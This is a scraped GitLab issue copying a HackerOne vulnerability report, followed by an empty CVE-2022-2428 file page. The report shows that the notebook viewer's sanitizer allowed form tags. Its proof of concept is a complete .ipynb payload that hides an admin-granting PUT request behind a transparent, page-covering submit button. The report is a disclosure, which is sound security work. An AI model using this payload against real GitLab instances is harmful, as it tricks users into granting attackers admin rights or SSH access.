=== Content from gitlab.com_9e9edd58_20250114_184748.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Issue any http requests when users view a .ipynb notebook and click anywhere

**[HackerOne report #1563379](https://hackerone.com/reports/1563379)** by `yvvdwf` on 2022-05-09, assigned to `GitLab Team`:

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

##### Summary

Hello,

The santization of a .ipynb notebook viewer does not exclude `form` tag. Consequently attackers may introduce a `form` which allows to send arbitrary POST requests to the server. PUT, DELETE, PATH requests can be achieved by setting value of`_method` field.

Attackers may also use `class` attribute to change the form submit button as a topmost transparent layer to intercept users' clicks. In the following example, users click anywhere on the webpage to trigger a form submit.

##### Steps to reproduce

1. In an existing project or create a new one, add a file, `notebook-test.ipynb` (you can change the basename but the `.ipynb` extension is important) with the following content:

```
{
  "cells": [
    {
      "cell_type": "code",
      "source": [ "print(\"Hello world\")"],
      "outputs": [
        {
          "data": {
            "text/html": [
              "<form action=/api/v4/users/5212593 method=post>",
              "<input name=_method value=PUT type=hidden>",
              "<input name=admin value=true type=hidden>",
              "<input type=submit class='fixed-top fixed-bottom text-hide gl-font-size-42 cursor-default' value='zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz'>"
            ]
          }
        }
      ]
    }
  ]
}
```

2. After committing the file, view it and click anywhere on the webpage. You will see a POST request to `/api/v4/users/5212593`. This is an example to escalate my account as Admin.

##### Impact

Attackers may trick users to perform unattended actions, such as (1) add attackers to Admin or a private group, (2) add attackers' SSH key, etc.

##### Examples

This example is in private mode, please tell me if you cannot access: <https://gitlab.com/yvvdwf/xss/-/blob/master/notebook-form.ipynb>

##### What is the current *bug* behavior?

The sanitization does not exclude `form` tag

##### What is the expected *correct* behavior?

The `form` tag should be excluded

##### Output of checks

This bug happens on GitLab.com

#### Impact

Attackers may trick users to perform unattended actions, such as (1) add attackers to Admin or a private group, (2) add attackers' SSH key, etc.

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [Screenshot\_2022-05-09\_at\_13.33.47.png](https://h1.sec.gitlab.net/a/3855d0b0-269a-481f-a9df-b08656938e73/Screenshot_2022-05-09_at_13.33.47.png)

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.



=== Content from gitlab.com_9b5e097b_20250114_184748.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

* [cves](/gitlab-org/cves/-/tree/master)
* [2022](/gitlab-org/cves/-/tree/master/2022)
* [**CVE-2022-2428.json**](/gitlab-org/cves/-/blob/master/2022/CVE-2022-2428.json)

Find file

[Blame](/gitlab-org/cves/-/blame/master/2022/CVE-2022-2428.json)
[Permalink](/gitlab-org/cves/-/blob/5dbfc725a86e6d942deec9c36b7f06f5b8d912fc/2022/CVE-2022-2428.json "Go to permalink <kbd class='flat ml-1' aria-hidden=true>y</kbd>")

* [![🤖 GitLab Bot 🤖's avatar](/uploads/-/system/user/avatar/1786152/avatar.png?width=64 "🤖 GitLab Bot 🤖")](/gitlab-bot)

  Oct 17, 2022

  [6ed2cf27](/gitlab-org/cves/-/commit/6ed2cf2757a06b51cebd8e76afa6842ea2074d13)
  [Publishing 0 updated advisories and 1 new advisories](/gitlab-org/cves/-/commit/6ed2cf2757a06b51cebd8e76afa6842ea2074d13)
  ·
  6ed2cf27

  [🤖 GitLab Bot 🤖](/gitlab-bot) authored Oct 17, 2022

  6ed2cf27

  [Publishing 0 updated advisories and 1 new advisories](/gitlab-org/cves/-/commit/6ed2cf2757a06b51cebd8e76afa6842ea2074d13)
  [🤖 GitLab Bot 🤖](/gitlab-bot) authored Oct 17, 2022

Loading


